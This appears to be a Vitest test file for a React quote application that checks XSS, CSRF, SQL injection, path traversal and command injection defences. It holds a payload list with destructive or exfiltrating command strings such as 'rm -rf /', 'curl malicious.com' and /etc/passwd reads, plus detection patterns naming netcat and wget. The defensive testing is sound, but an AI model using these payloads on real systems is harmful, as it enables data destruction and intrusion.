import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react';
import { BrowserRouter } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import userEvent from '@testing-library/user-event';

import { UnifiedQuoteForm } from '../../UnifiedQuoteForm';
import { UnifiedQuoteCard } from '../../UnifiedQuoteCard';
import { UnifiedQuoteActions } from '../../UnifiedQuoteActions';
import { UnifiedQuoteBreakdown } from '../../UnifiedQuoteBreakdown';
import { UnifiedQuoteList } from '../../UnifiedQuoteList';
import { QuoteThemeProvider } from '@/contexts/QuoteThemeContext';
import type { UnifiedQuote } from '@/types/unified-quote';

// Mock DOMPurify for XSS protection testing
const mockDOMPurify = {
  sanitize: vi.fn().mockImplementation((dirty: string) => {
    // Mock sanitization - removes script tags and dangerous content
    return dirty
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '')
      .replace(/<iframe/gi, '')
      .replace(/<object/gi, '')
      .replace(/<embed/gi, '');
  }),
  isValidAttribute: vi.fn().mockReturnValue(true),
  addHook: vi.fn(),
};

// Mock CSP (Content Security Policy) violations
const mockCSPViolations: SecurityPolicyViolationEvent[] = [];
Object.defineProperty(window, 'SecurityPolicyViolationEvent', {
  value: class MockSecurityPolicyViolationEvent extends Event {
    public violatedDirective: string;
    public blockedURI: string;
    public sourceFile: string;
    public lineNumber: number;

    constructor(type: string, eventInitDict: any) {
      super(type, eventInitDict);
      this.violatedDirective = eventInitDict.violatedDirective || '';
      this.blockedURI = eventInitDict.blockedURI || '';
      this.sourceFile = eventInitDict.sourceFile || '';
      this.lineNumber = eventInitDict.lineNumber || 0;
    }
  },
  configurable: true,
});

// Mock crypto API for secure random generation
Object.defineProperty(window, 'crypto', {
  value: {
    getRandomValues: vi.fn().mockImplementation((array: Uint8Array) => {
      for (let i = 0; i < array.length; i++) {
        array[i] = Math.floor(Math.random() * 256);
      }
      return array;
    }),
    randomUUID: vi.fn().mockImplementation(() =>
      'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
        const r = (Math.random() * 16) | 0;
        const v = c === 'x' ? r : (r & 0x3) | 0x8;
        return v.toString(16);
      }),
    ),
    subtle: {
      digest: vi.fn().mockResolvedValue(new ArrayBuffer(32)),
      encrypt: vi.fn().mockResolvedValue(new ArrayBuffer(16)),
      decrypt: vi.fn().mockResolvedValue(new ArrayBuffer(16)),
    },
  },
  configurable: true,
});

// Mock Web Authentication API for security testing
Object.defineProperty(navigator, 'credentials', {
  value: {
    create: vi.fn().mockResolvedValue({
      id: 'mock-credential-id',
      type: 'public-key',
      rawId: new ArrayBuffer(16),
      response: {
        clientDataJSON: new ArrayBuffer(32),
        attestationObject: new ArrayBuffer(64),
      },
    }),
    get: vi.fn().mockResolvedValue({
      id: 'mock-credential-id',
      type: 'public-key',
      rawId: new ArrayBuffer(16),
      response: {
        clientDataJSON: new ArrayBuffer(32),
        authenticatorData: new ArrayBuffer(64),
        signature: new ArrayBuffer(32),
      },
    }),
  },
  configurable: true,
});

// Mock dependencies
vi.mock('@/contexts/AuthContext', () => ({
  useAuth: () => ({
    user: {
      id: 'security-user-id',
      email: 'security@example.com',
      role: 'customer',
      mfa_enabled: true,
    },
  }),
}));

vi.mock('@/hooks/useAdminRole', () => ({
  useAdminRole: () => ({
    data: false,
    isLoading: false,
  }),
}));

// Security test data with potentially malicious content
const securityTestQuote: UnifiedQuote = {
  id: 'security-quote-001',
  display_id: 'QT-SEC001',
  user_id: 'security-user-id',
  status: 'sent',
  created_at: '2024-01-15T10:00:00Z',
  expires_at: '2024-02-15T10:00:00Z',
  final_total_usd: 299.99,
  item_price: 249.99,
  sales_tax_price: 20.0,
  merchant_shipping_price: 15.0,
  international_shipping: 25.0,
  customs_and_ecs: 12.5,
  domestic_shipping: 7.5,
  handling_charge: 5.0,
  insurance_amount: 2.5,
  payment_gateway_fee: 3.75,
  vat: 0.0,
  discount: 10.0,
  destination_country: 'IN',
  origin_country: 'US',
  website: 'amazon.com',
  customer_data: {
    info: {
      name: 'Security Test User',
      email: 'security@example.com',
      phone: '+91-9876543210',
    },
  },
  shipping_address: {
    formatted: '123 Security Street, Mumbai, Maharashtra 400001, India',
  },
  items: [
    {
      id: 'security-item',
      name: 'Test Security Product',
      description: 'Product for security testing',
      quantity: 1,
      price: 249.99,
      product_url: 'https://amazon.com/security-product',
      image_url: 'https://example.com/security.jpg',
    },
  ],
  notes: 'Security test quote',
  admin_notes: '',
  priority: 'medium',
  in_cart: false,
  attachments: [],
};

// Malicious payloads for security testing
const maliciousPayloads = {
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<object data="javascript:alert(\'XSS\')"></object>',
    '<embed src="javascript:alert(\'XSS\')">',
    '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    '<style>@import "javascript:alert(\'XSS\')"</style>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  ],
  sql_injection: [
    "'; DROP TABLE quotes; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; INSERT INTO quotes VALUES ('malicious') --",
    "' AND SLEEP(5) --",
  ],
  path_traversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/shadow',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
  ],
  command_injection: [
    '; cat /etc/passwd',
    '| ls -la',
    '& whoami',
    '`rm -rf /`',
    '$(curl malicious.com)',
    '${cat /etc/passwd}',
  ],
};

// Helper function to render components with providers
const renderWithProviders = (component: React.ReactNode) => {
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: { retry: false },
      mutations: { retry: false },
    },
  });

  return render(
    <QueryClientProvider client={queryClient}>
      <BrowserRouter>
        <QuoteThemeProvider>{component}</QuoteThemeProvider>
      </BrowserRouter>
    </QueryClientProvider>,
  );
};

describe('Security Compliance Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockCSPViolations.length = 0;
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('XSS (Cross-Site Scripting) Protection', () => {
    it('should sanitize malicious scripts in form inputs', async () => {
      const XSSProtectionTest = () => {
        const [sanitizedValue, setSanitizedValue] = React.useState('');

        const handleInputChange = (value: string) => {
          // Simulate sanitization
          const cleaned = mockDOMPurify.sanitize(value);
          setSanitizedValue(cleaned);
        };

        return (
          <div>
            <div data-testid="sanitized-output">{sanitizedValue}</div>
            <UnifiedQuoteForm
              mode="create"
              viewMode="guest"
              onSubmit={vi.fn()}
              onInputChange={handleInputChange}
            />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<XSSProtectionTest />);

      // Test each XSS payload
      for (const payload of maliciousPayloads.xss) {
        const nameInput = screen.getByLabelText(/your name/i);
        await user.clear(nameInput);
        await user.type(nameInput, payload);

        await waitFor(() => {
          const output = screen.getByTestId('sanitized-output');
          // Should not contain script tags or dangerous content
          expect(output.textContent).not.toContain('<script>');
          expect(output.textContent).not.toContain('javascript:');
          expect(output.textContent).not.toContain('onerror=');
        });
      }

      expect(mockDOMPurify.sanitize).toHaveBeenCalled();
    });

    it('should prevent XSS in quote display data', async () => {
      const maliciousQuote = {
        ...securityTestQuote,
        display_id: '<script>alert("XSS")</script>QT-MALICIOUS',
        customer_data: {
          info: {
            name: '<img src=x onerror=alert("XSS")>Malicious User',
            email: 'user@example.com',
            phone: '+1234567890',
          },
        },
        items: [
          {
            ...securityTestQuote.items[0],
            name: '<svg onload=alert("XSS")>Malicious Product',
            description: '<iframe src="javascript:alert(\'XSS\')"></iframe>Evil description',
          },
        ],
      };

      const XSSDisplayTest = () => {
        const sanitizeContent = (content: string) => {
          return mockDOMPurify.sanitize(content);
        };

        return (
          <div>
            <div data-testid="quote-id">{sanitizeContent(maliciousQuote.display_id)}</div>
            <div data-testid="customer-name">
              {sanitizeContent(maliciousQuote.customer_data.info.name)}
            </div>
            <div data-testid="product-name">{sanitizeContent(maliciousQuote.items[0].name)}</div>
            <UnifiedQuoteCard quote={maliciousQuote} viewMode="customer" layout="detail" />
          </div>
        );
      };

      renderWithProviders(<XSSDisplayTest />);

      await waitFor(() => {
        expect(screen.getByTestId('quote-id')).toHaveTextContent('QT-MALICIOUS');
        expect(screen.getByTestId('customer-name')).toHaveTextContent('Malicious User');
        expect(screen.getByTestId('product-name')).toHaveTextContent('Malicious Product');

        // Should not contain any script tags in the DOM
        expect(document.querySelectorAll('script')).toHaveLength(0);
        expect(document.querySelectorAll('iframe')).toHaveLength(0);
        expect(document.querySelectorAll('svg[onload]')).toHaveLength(0);
      });
    });

    it('should handle DOM manipulation attempts', async () => {
      const DOMManipulationTest = () => {
        const [userContent, setUserContent] = React.useState('');

        const handleUserInput = (content: string) => {
          // Sanitize before setting in state
          const sanitized = mockDOMPurify.sanitize(content);
          setUserContent(sanitized);
        };

        React.useEffect(() => {
          // Monitor for unauthorized DOM changes
          const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
              if (mutation.type === 'childList') {
                mutation.addedNodes.forEach((node) => {
                  if (node.nodeType === Node.ELEMENT_NODE) {
                    const element = node as Element;
                    if (element.tagName === 'SCRIPT') {
                      // Remove any injected script tags
                      element.remove();
                      console.warn('Blocked script injection attempt');
                    }
                  }
                });
              }
            });
          });

          observer.observe(document.body, { childList: true, subtree: true });

          return () => observer.disconnect();
        }, []);

        return (
          <div>
            <textarea
              data-testid="user-input"
              onChange={(e) => handleUserInput(e.target.value)}
              placeholder="Enter content"
            />
            <div data-testid="user-content" dangerouslySetInnerHTML={{ __html: userContent }} />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<DOMManipulationTest />);

      const textarea = screen.getByTestId('user-input');
      await user.type(textarea, '<script>document.body.innerHTML = "HACKED"</script>');

      await waitFor(() => {
        const content = screen.getByTestId('user-content');
        expect(content.innerHTML).not.toContain('<script>');
        expect(document.body.innerHTML).not.toContain('HACKED');
      });
    });
  });

  describe('CSRF (Cross-Site Request Forgery) Protection', () => {
    it('should validate CSRF tokens on form submissions', async () => {
      const CSRFProtectionTest = () => {
        const [csrfToken, setCsrfToken] = React.useState('');

        React.useEffect(() => {
          // Generate CSRF token
          const token = window.crypto.randomUUID();
          setCsrfToken(token);
        }, []);

        const handleSubmit = async (formData: any) => {
          // Validate CSRF token
          const submittedToken = formData.csrfToken;
          if (submittedToken !== csrfToken) {
            throw new Error('CSRF token validation failed');
          }

          return { success: true };
        };

        return (
          <div>
            <div data-testid="csrf-token">{csrfToken}</div>
            <UnifiedQuoteForm
              mode="create"
              viewMode="guest"
              onSubmit={handleSubmit}
              csrfToken={csrfToken}
            />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<CSRFProtectionTest />);

      await waitFor(() => {
        const tokenElement = screen.getByTestId('csrf-token');
        expect(tokenElement.textContent).toMatch(
          /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/,
        );
      });

      // Fill form with valid data
      await user.type(screen.getByLabelText(/product url/i), 'https://amazon.com/test');
      await user.type(screen.getByLabelText(/your name/i), 'Test User');
      await user.type(screen.getByLabelText(/email address/i), 'test@example.com');

      const submitButton = screen.getByRole('button', { name: /submit quote request/i });
      await user.click(submitButton);

      // Should succeed with valid CSRF token
      await waitFor(() => {
        expect(window.crypto.randomUUID).toHaveBeenCalled();
      });
    });

    it('should reject requests with invalid CSRF tokens', async () => {
      const InvalidCSRFTest = () => {
        const [error, setError] = React.useState('');

        const handleSubmit = async (formData: any) => {
          try {
            // Simulate invalid CSRF token
            if (formData.csrfToken !== 'valid-token') {
              throw new Error('CSRF token validation failed');
            }
          } catch (err) {
            setError((err as Error).message);
            throw err;
          }
        };

        return (
          <div>
            <div data-testid="error-message">{error}</div>
            <UnifiedQuoteForm
              mode="create"
              viewMode="guest"
              onSubmit={handleSubmit}
              csrfToken="invalid-token"
            />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<InvalidCSRFTest />);

      // Fill and submit form
      await user.type(screen.getByLabelText(/product url/i), 'https://amazon.com/test');
      await user.type(screen.getByLabelText(/your name/i), 'Test User');
      await user.type(screen.getByLabelText(/email address/i), 'test@example.com');

      const submitButton = screen.getByRole('button', { name: /submit quote request/i });
      await user.click(submitButton);

      await waitFor(() => {
        expect(screen.getByTestId('error-message')).toHaveTextContent(
          'CSRF token validation failed',
        );
      });
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and reject SQL injection attempts', async () => {
      const SQLInjectionTest = () => {
        const [validationErrors, setValidationErrors] = React.useState<string[]>([]);

        const validateInput = (input: string) => {
          const errors = [];

          // Check for SQL injection patterns
          const sqlPatterns = [
            /('|(\\')|(;)|(\\;)|(\\)|(\\))/g,
            /((\\+)|(;|(\\;))|(\\)|(\\)))*('|(\\'))/g,
            /(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)/gi,
          ];

          sqlPatterns.forEach((pattern, index) => {
            if (pattern.test(input)) {
              errors.push(`SQL injection pattern detected (${index + 1})`);
            }
          });

          return errors;
        };

        const handleInputChange = (value: string) => {
          const errors = validateInput(value);
          setValidationErrors(errors);
        };

        return (
          <div>
            <div data-testid="validation-errors">{validationErrors.join(', ')}</div>
            <input
              data-testid="sql-test-input"
              onChange={(e) => handleInputChange(e.target.value)}
              placeholder="Enter text"
            />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<SQLInjectionTest />);

      // Test SQL injection payloads
      for (const payload of maliciousPayloads.sql_injection) {
        const input = screen.getByTestId('sql-test-input');
        await user.clear(input);
        await user.type(input, payload);

        await waitFor(() => {
          const errors = screen.getByTestId('validation-errors');
          expect(errors.textContent).toContain('SQL injection pattern detected');
        });
      }
    });

    it('should prevent path traversal attacks', async () => {
      const PathTraversalTest = () => {
        const [isValidPath, setIsValidPath] = React.useState(true);

        const validatePath = (path: string) => {
          // Check for path traversal patterns
          const dangerousPatterns = [
            /\.\./g,
            /\/etc\//g,
            /\/windows\//g,
            /\\system32\\/g,
            /\.\.\\|\.\.\//g,
          ];

          return !dangerousPatterns.some((pattern) => pattern.test(path));
        };

        const handleFileInput = (value: string) => {
          const valid = validatePath(value);
          setIsValidPath(valid);
        };

        return (
          <div>
            <div data-testid="path-validation">{isValidPath ? 'valid' : 'invalid'}</div>
            <input
              data-testid="file-path-input"
              onChange={(e) => handleFileInput(e.target.value)}
              placeholder="Enter file path"
            />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<PathTraversalTest />);

      // Test path traversal payloads
      for (const payload of maliciousPayloads.path_traversal) {
        const input = screen.getByTestId('file-path-input');
        await user.clear(input);
        await user.type(input, payload);

        await waitFor(() => {
          expect(screen.getByTestId('path-validation')).toHaveTextContent('invalid');
        });
      }
    });

    it('should prevent command injection attempts', async () => {
      const CommandInjectionTest = () => {
        const [isSafeCommand, setIsSafeCommand] = React.useState(true);

        const validateCommand = (cmd: string) => {
          // Check for command injection patterns
          const commandPatterns = [
            /[;&|`$(){}[\]]/g,
            /(rm|del|format|cat|ls|dir|whoami|curl|wget|nc|netcat)/gi,
            /(\||&|;|`|\$\(|\$\{)/g,
          ];

          return !commandPatterns.some((pattern) => pattern.test(cmd));
        };

        const handleCommandInput = (value: string) => {
          const safe = validateCommand(value);
          setIsSafeCommand(safe);
        };

        return (
          <div>
            <div data-testid="command-validation">{isSafeCommand ? 'safe' : 'dangerous'}</div>
            <input
              data-testid="command-input"
              onChange={(e) => handleCommandInput(e.target.value)}
              placeholder="Enter command"
            />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<CommandInjectionTest />);

      // Test command injection payloads
      for (const payload of maliciousPayloads.command_injection) {
        const input = screen.getByTestId('command-input');
        await user.clear(input);
        await user.type(input, payload);

        await waitFor(() => {
          expect(screen.getByTestId('command-validation')).toHaveTextContent('dangerous');
        });
      }
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types and prevent malicious uploads', async () => {
      const FileUploadSecurityTest = () => {
        const [uploadResult, setUploadResult] = React.useState('');

        const validateFile = (file: File) => {
          // Allowed file types
          const allowedTypes = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'application/pdf',
            'text/plain',
            'application/msword',
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          ];

          // Dangerous extensions
          const dangerousExtensions = [
            '.exe',
            '.bat',
            '.cmd',
            '.scr',
            '.pif',
            '.com',
            '.js',
            '.vbs',
            '.jar',
            '.zip',
            '.rar',
          ];

          const fileName = file.name.toLowerCase();
          const fileType = file.type;

          // Check file type
          if (!allowedTypes.includes(fileType)) {
            return { valid: false, reason: 'File type not allowed' };
          }

          // Check extension
          if (dangerousExtensions.some((ext) => fileName.endsWith(ext))) {
            return { valid: false, reason: 'Dangerous file extension' };
          }

          // Check file size (max 10MB)
          if (file.size > 10 * 1024 * 1024) {
            return { valid: false, reason: 'File too large' };
          }

          return { valid: true, reason: 'File valid' };
        };

        const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
          const file = event.target.files?.[0];
          if (file) {
            const validation = validateFile(file);
            setUploadResult(validation.reason);
          }
        };

        return (
          <div>
            <div data-testid="upload-result">{uploadResult}</div>
            <input type="file" data-testid="file-upload" onChange={handleFileUpload} />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<FileUploadSecurityTest />);

      // Test malicious file
      const maliciousFile = new File(['malicious content'], 'virus.exe', {
        type: 'application/octet-stream',
      });

      const fileInput = screen.getByTestId('file-upload');
      await user.upload(fileInput, maliciousFile);

      await waitFor(() => {
        expect(screen.getByTestId('upload-result')).toHaveTextContent('File type not allowed');
      });

      // Test valid file
      const validFile = new File(['valid content'], 'document.pdf', {
        type: 'application/pdf',
      });

      await user.upload(fileInput, validFile);

      await waitFor(() => {
        expect(screen.getByTestId('upload-result')).toHaveTextContent('File valid');
      });
    });

    it('should scan file content for malicious patterns', async () => {
      const FileContentScanTest = () => {
        const [scanResult, setScanResult] = React.useState('');

        const scanFileContent = async (file: File) => {
          const content = await file.text();

          // Scan for malicious patterns
          const maliciousPatterns = [
            /<script/gi,
            /javascript:/gi,
            /vbscript:/gi,
            /onload=/gi,
            /onerror=/gi,
            /eval\(/gi,
            /document\.write/gi,
          ];

          const foundPattern = maliciousPatterns.find((pattern) => pattern.test(content));

          if (foundPattern) {
            return { safe: false, reason: 'Malicious content detected' };
          }

          return { safe: true, reason: 'Content safe' };
        };

        const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
          const file = event.target.files?.[0];
          if (file) {
            const result = await scanFileContent(file);
            setScanResult(result.reason);
          }
        };

        return (
          <div>
            <div data-testid="scan-result">{scanResult}</div>
            <input type="file" data-testid="content-scan-upload" onChange={handleFileUpload} />
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<FileContentScanTest />);

      // Test file with malicious content
      const maliciousContent = new File(
        ['<script>alert("malicious")</script>Normal content here'],
        'malicious.txt',
        { type: 'text/plain' },
      );

      const fileInput = screen.getByTestId('content-scan-upload');
      await user.upload(fileInput, maliciousContent);

      await waitFor(() => {
        expect(screen.getByTestId('scan-result')).toHaveTextContent('Malicious content detected');
      });
    });
  });

  describe('Content Security Policy (CSP) Compliance', () => {
    it('should detect and report CSP violations', async () => {
      const CSPViolationTest = () => {
        const [violations, setViolations] = React.useState<string[]>([]);

        React.useEffect(() => {
          const handleCSPViolation = (event: SecurityPolicyViolationEvent) => {
            const violation = `${event.violatedDirective}: ${event.blockedURI}`;
            setViolations((prev) => [...prev, violation]);

            // Report to server (mock)
            console.warn('CSP Violation:', {
              directive: event.violatedDirective,
              blockedURI: event.blockedURI,
              sourceFile: event.sourceFile,
              lineNumber: event.lineNumber,
            });
          };

          document.addEventListener('securitypolicyviolation', handleCSPViolation as EventListener);

          return () => {
            document.removeEventListener(
              'securitypolicyviolation',
              handleCSPViolation as EventListener,
            );
          };
        }, []);

        const triggerCSPViolation = () => {
          // Simulate CSP violation
          const violation = new window.SecurityPolicyViolationEvent('securitypolicyviolation', {
            violatedDirective: 'script-src',
            blockedURI: 'inline',
            sourceFile: 'https://example.com/page',
            lineNumber: 42,
          });

          document.dispatchEvent(violation);
        };

        return (
          <div>
            <div data-testid="violations-count">{violations.length}</div>
            <div data-testid="violations-list">
              {violations.map((violation, index) => (
                <div key={index}>{violation}</div>
              ))}
            </div>
            <button onClick={triggerCSPViolation} data-testid="trigger-violation">
              Trigger CSP Violation
            </button>
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<CSPViolationTest />);

      const triggerButton = screen.getByTestId('trigger-violation');
      await user.click(triggerButton);

      await waitFor(() => {
        expect(screen.getByTestId('violations-count')).toHaveTextContent('1');
        expect(screen.getByTestId('violations-list')).toHaveTextContent('script-src: inline');
      });
    });

    it('should enforce strict CSP policies', async () => {
      const StrictCSPTest = () => {
        const [policy, setPolicy] = React.useState('');

        React.useEffect(() => {
          // Mock strict CSP policy
          const strictPolicy = [
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: https:",
            "font-src 'self'",
            "connect-src 'self'",
            "media-src 'none'",
            "object-src 'none'",
            "child-src 'none'",
            "worker-src 'none'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
          ].join('; ');

          setPolicy(strictPolicy);
        }, []);

        return (
          <div>
            <div data-testid="csp-policy">{policy}</div>
            <UnifiedQuoteCard quote={securityTestQuote} viewMode="customer" layout="detail" />
          </div>
        );
      };

      renderWithProviders(<StrictCSPTest />);

      await waitFor(() => {
        const policyElement = screen.getByTestId('csp-policy');
        expect(policyElement.textContent).toContain("default-src 'self'");
        expect(policyElement.textContent).toContain("object-src 'none'");
        expect(policyElement.textContent).toContain("frame-ancestors 'none'");
      });
    });
  });

  describe('Authentication and Authorization Security', () => {
    it('should validate user permissions for sensitive actions', async () => {
      const PermissionValidationTest = () => {
        const [actionResult, setActionResult] = React.useState('');

        const validatePermission = (action: string, userRole: string) => {
          const permissions = {
            admin: ['view', 'edit', 'delete', 'approve', 'export'],
            moderator: ['view', 'edit', 'approve'],
            customer: ['view', 'edit_own'],
            guest: ['view'],
          };

          const userPermissions = permissions[userRole as keyof typeof permissions] || [];
          return userPermissions.includes(action);
        };

        const handleAction = (action: string) => {
          const hasPermission = validatePermission(action, 'customer');
          setActionResult(hasPermission ? 'allowed' : 'denied');
        };

        return (
          <div>
            <div data-testid="action-result">{actionResult}</div>
            <button onClick={() => handleAction('delete')} data-testid="delete-action">
              Delete Quote
            </button>
            <button onClick={() => handleAction('view')} data-testid="view-action">
              View Quote
            </button>
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<PermissionValidationTest />);

      // Test restricted action
      const deleteButton = screen.getByTestId('delete-action');
      await user.click(deleteButton);

      await waitFor(() => {
        expect(screen.getByTestId('action-result')).toHaveTextContent('denied');
      });

      // Test allowed action
      const viewButton = screen.getByTestId('view-action');
      await user.click(viewButton);

      await waitFor(() => {
        expect(screen.getByTestId('action-result')).toHaveTextContent('allowed');
      });
    });

    it('should implement secure session management', async () => {
      const SessionSecurityTest = () => {
        const [sessionStatus, setSessionStatus] = React.useState('active');

        React.useEffect(() => {
          // Mock secure session management
          const sessionTimeout = 30 * 60 * 1000; // 30 minutes
          const lastActivity = Date.now();

          const checkSessionValidity = () => {
            const now = Date.now();
            if (now - lastActivity > sessionTimeout) {
              setSessionStatus('expired');
              // Clear sensitive data
              localStorage.removeItem('user_session');
              sessionStorage.clear();
            }
          };

          const sessionCheck = setInterval(checkSessionValidity, 60000); // Check every minute

          return () => clearInterval(sessionCheck);
        }, []);

        const refreshSession = () => {
          // Mock session refresh
          const newToken = window.crypto.randomUUID();
          localStorage.setItem('session_token', newToken);
          setSessionStatus('refreshed');
        };

        return (
          <div>
            <div data-testid="session-status">{sessionStatus}</div>
            <button onClick={refreshSession} data-testid="refresh-session">
              Refresh Session
            </button>
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<SessionSecurityTest />);

      expect(screen.getByTestId('session-status')).toHaveTextContent('active');

      const refreshButton = screen.getByTestId('refresh-session');
      await user.click(refreshButton);

      await waitFor(() => {
        expect(screen.getByTestId('session-status')).toHaveTextContent('refreshed');
      });
    });
  });

  describe('Data Privacy and GDPR Compliance', () => {
    it('should implement data anonymization for sensitive information', async () => {
      const DataAnonymizationTest = () => {
        const anonymizeData = (data: any, fields: string[]) => {
          const anonymized = { ...data };

          fields.forEach((field) => {
            if (anonymized[field]) {
              if (field.includes('email')) {
                // Anonymize email
                const [local, domain] = anonymized[field].split('@');
                anonymized[field] = `${local.substring(0, 2)}***@${domain}`;
              } else if (field.includes('phone')) {
                // Anonymize phone
                anonymized[field] = anonymized[field].replace(/\d(?=\d{4})/g, '*');
              } else {
                // Generic anonymization
                anonymized[field] = '*'.repeat(anonymized[field].length);
              }
            }
          });

          return anonymized;
        };

        const sensitiveFields = ['email', 'phone', 'address'];
        const anonymizedQuote = anonymizeData(
          securityTestQuote.customer_data.info,
          sensitiveFields,
        );

        return (
          <div>
            <div data-testid="original-email">{securityTestQuote.customer_data.info.email}</div>
            <div data-testid="anonymized-email">{anonymizedQuote.email}</div>
            <div data-testid="original-phone">{securityTestQuote.customer_data.info.phone}</div>
            <div data-testid="anonymized-phone">{anonymizedQuote.phone}</div>
          </div>
        );
      };

      renderWithProviders(<DataAnonymizationTest />);

      await waitFor(() => {
        expect(screen.getByTestId('original-email')).toHaveTextContent('security@example.com');
        expect(screen.getByTestId('anonymized-email')).toHaveTextContent('se***@example.com');
        expect(screen.getByTestId('original-phone')).toHaveTextContent('+91-9876543210');
        expect(screen.getByTestId('anonymized-phone')).toHaveTextContent('*********3210');
      });
    });

    it('should provide data export functionality for GDPR compliance', async () => {
      const GDPRExportTest = () => {
        const [exportData, setExportData] = React.useState('');

        const exportUserData = () => {
          // Mock GDPR data export
          const userData = {
            personal_info: {
              name: securityTestQuote.customer_data.info.name,
              email: securityTestQuote.customer_data.info.email,
              phone: securityTestQuote.customer_data.info.phone,
            },
            quotes: [securityTestQuote],
            activity_log: [
              { action: 'quote_created', timestamp: '2024-01-15T10:00:00Z' },
              { action: 'quote_approved', timestamp: '2024-01-16T11:00:00Z' },
            ],
            data_processing_purposes: ['Service delivery', 'Communication', 'Legal compliance'],
          };

          setExportData(JSON.stringify(userData, null, 2));
        };

        return (
          <div>
            <button onClick={exportUserData} data-testid="export-data">
              Export My Data
            </button>
            <div data-testid="export-result">{exportData ? 'Data exported' : 'No export'}</div>
            <pre data-testid="exported-data">{exportData.substring(0, 200)}...</pre>
          </div>
        );
      };

      const user = userEvent.setup();
      renderWithProviders(<GDPRExportTest />);

      const exportButton = screen.getByTestId('export-data');
      await user.click(exportButton);

      await waitFor(() => {
        expect(screen.getByTestId('export-result')).toHaveTextContent('Data exported');
        expect(screen.getByTestId('exported-data')).toHaveTextContent('personal_info');
      });
    });
  });
});
